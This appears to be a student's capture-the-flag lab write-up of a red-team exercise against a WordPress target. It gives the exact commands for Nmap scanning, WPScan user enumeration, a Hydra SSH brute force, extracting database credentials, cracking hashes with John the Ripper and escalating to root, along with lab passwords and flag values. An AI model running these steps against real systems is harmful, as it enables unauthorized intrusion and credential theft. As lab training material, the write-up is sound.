# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

Command: $ nmap -sV 192.168.1.110

This scan identifies the services below as potential points of entry:
- Target 1
  - List of
  - Exposed Services

The following vulnerabilities were identified on each target:
- Target 1
- Port 22/TCP Open SSH
- Port 80/TCP Open HTTP
- Port 111/TCP Open rcpbid
- Port 139/TCP Open netbios-ssn
- Port 445/TCP Open netbios-ssn

**Critical Vulnerabilities

- Target 1
 - User Enumeration (WordPress site)
 - Found the occurrence of simplistic usernames and weak passwords (Hydra Command)
 - Brute forced ssh to gain access in to the system.
 - Secure files are not hidden away.
 - Misconfiguration of User Privileges/ Privilege Escalation

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
     - Command: $ wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u
     - WPScan to enumerate users on the Target1 WordPress site.
     - Targeting the user michael
     - Small manual Brute Force attack to guess/finds Michael's password.
     - Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
     - The first Flag was found in /var/www/html folder at root in services.html in a HTML comment below the footer.
<img width="792" alt="Screen Shot 2022-06-08 at 8 59 21 PM" src="https://user-images.githubusercontent.com/94859787/173471459-2b0c890f-088e-4639-9bb1-0920e0ea7406.png">
<img width="627" alt="Screen Shot 2022-06-11 at 10 29 21 AM" src="https://user-images.githubusercontent.com/94859787/173471682-4a6b1541-b757-4c31-99a6-9bfdbd6a0379.png">
<img width="818" alt="Screen Shot 2022-06-11 at 10 33 43 AM" src="https://user-images.githubusercontent.com/94859787/173471702-c356894b-2d23-4d58-a5ba-ff25b40ec036.png">

 - `flag2.txt`: {fc3fd5Bdcdad9ab23facac6e9a365e581c33}
   - **Exploit Used**
      - Once again, browsing through the files and directories, Flag2 can be found in /var/www next to the html folder where Flag1 was found.
      - Command: cd /var/www, ls -l,cat flag2.txt
<img width="287" alt="Screen Shot 2022-06-11 at 10 36 37 AM" src="https://user-images.githubusercontent.com/94859787/173472214-9479509b-366f-4e84-9425-41f4418f374d.png"> 
  - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd23}
    - **Exploit Used**
      - Capturing Flag3: Access the MYSQL database. Discovering the wp-config.php and gaining access to the database credentials as the user Michael, MYSQL when used to explore the database.
      - Commands: mysql -u root -p 'R@v3nSecurity', show databases;, use wordpress;, select * from wp_posts;
<img width="815" alt="Screen Shot 2022-06-11 at 10 52 18 AM" src="https://user-images.githubusercontent.com/94859787/173472806-f3108979-a35f-4932-a6dc-eb1f61884bde.png">
<img width="824" alt="Screen Shot 2022-06-11 at 11 04 57 AM" src="https://user-images.githubusercontent.com/94859787/173472854-44f892e8-12f9-402b-8168-37308962dd83.png">
<img width="811" alt="Screen Shot 2022-06-11 at 11 05 04 AM" src="https://user-images.githubusercontent.com/94859787/173472870-f24f9982-b748-4d8c-9717-f0b45b15ebc6.png">
  - `flag4.txt`: {715dea6c055b9fe3337544932F2941ce}
    - **Exploit Used**
      - Gained user credentials, cracked password with John the Ripper and used Python to gain root privileges.
      - The credentials were located in the wp_users table in the wordpress database. The usernames and passwords were copied and saved on the Kali machine in a file call wp_hashes.txt.
      - Commands:mysql -u root -p'R@v3nSecurity', show databases;, use wordpress;, show tables;, select * from users;
      - On the Kali machine the wp_hashes.txt ran against John the Ripper to crack the hashes.
      - Command: - john wp_hashes.txt
 <img width="842" alt="Screen Shot 2022-06-11 at 11 10 33 AM" src="https://user-images.githubusercontent.com/94859787/173473654-7aecd97a-e56a-4ca4-9de7-f373eb2c5308.png">
 <img width="565" alt="Screen Shot 2022-06-11 at 11 40 34 AM" src="https://user-images.githubusercontent.com/94859787/173473685-b5f6113b-288a-488e-8b0c-f2345795ab71.png">
      - Once the user Steven's password hash was crached, the next step was to SSH in the server as Steven. Under the user Steven, privileges will first be checked, and escalated to root by guessing common root passwords.
      - Commands:ssh steven@192.168.1.110, password: pink:84, sudo -l, su root, password: toor, find /-iname flag*, cat /root/flag4.txt
 <img width="532" alt="Screen Shot 2022-06-11 at 12 03 41 PM" src="https://user-images.githubusercontent.com/94859787/173474143-1cc50665-37a2-4fe8-a0ba-ae287ce35406.png">


 

